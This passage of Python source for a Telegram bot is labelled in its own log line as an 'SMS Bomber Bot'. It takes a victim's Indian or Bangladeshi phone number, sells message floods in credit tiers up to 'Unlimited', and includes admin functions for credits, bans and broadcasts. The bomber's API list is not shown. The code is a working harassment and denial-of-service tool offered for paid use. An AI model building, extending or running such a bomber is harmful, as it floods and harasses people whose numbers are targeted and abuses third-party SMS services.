    raw = message.text.strip().replace(" ", "").replace("+", "")
    if not raw.isdigit() or len(raw) < 8:
        bot.reply_to(message, "❌ Invalid format. Please send like `+91 9876543210` or `8801234567890`.")
        return
    if raw.startswith("91") and len(raw) >= 12:
        country_code = "91"
        number = raw[2:]
    elif raw.startswith("880") and len(raw) >= 13:
        country_code = "880"
        number = raw[3:]
    else:
        bot.reply_to(message, "❌ Could not detect country code. Use +91 or +880 explicitly.")
        return
    if not number.isdigit() or len(number) < 7:
        bot.reply_to(message, "❌ Invalid number after country code.")
        return
    USER_STATE[user_id] = {'country': country_code, 'number': number}
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton("50 (1 credit)", callback_data="count_50"),
        InlineKeyboardButton("100 (1 credit)", callback_data="count_100"),
        InlineKeyboardButton("200 (3 credits)", callback_data="count_200"),
        InlineKeyboardButton("500 (3 credits)", callback_data="count_500"),
        InlineKeyboardButton("Unlimited (10 credits)", callback_data="count_unlimited")
    )
    kb.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
    bot.reply_to(message, "📊 Select the number of messages to send:", reply_markup=kb)

# ================== ADMIN HELPER FUNCTIONS ==================
def admin_credit_action(message, action):
    try:
        parts = message.text.split()
        uid = int(parts[0])
        amt = int(parts[1])
        if action == "add":
            add_credits(uid, amt)
            bot.reply_to(message, f"✅ Added {amt} credits to {uid}.")
        else:
            remove_credits(uid, amt)
            bot.reply_to(message, f"✅ Removed {amt} credits from {uid}.")
    except:
        bot.reply_to(message, "❌ Invalid format. Use: `user_id credits`")

def admin_ban_action(message, ban):
    try:
        uid = int(message.text.strip())
        set_ban_status(uid, ban)
        status = "banned" if ban else "unbanned"
        bot.reply_to(message, f"✅ User {uid} {status}.")
    except:
        bot.reply_to(message, "❌ Invalid user ID.")

def admin_broadcast_action(message):
    text = message.text
    rows = get_all_users()
    success = 0
    for row in rows:
        try:
            bot.send_message(row['user_id'], f"📢 Broadcast:\n\n{text}", parse_mode="HTML")
            success += 1
        except:
            pass
    bot.reply_to(message, f"✅ Broadcast sent to {success} users.")

# ================== RUN ==================
if __name__ == "__main__":
    logger.info("🚀 SMS Bomber Bot started (FIXED: exact count, shuffled APIs)")
    bot.infinity_polling()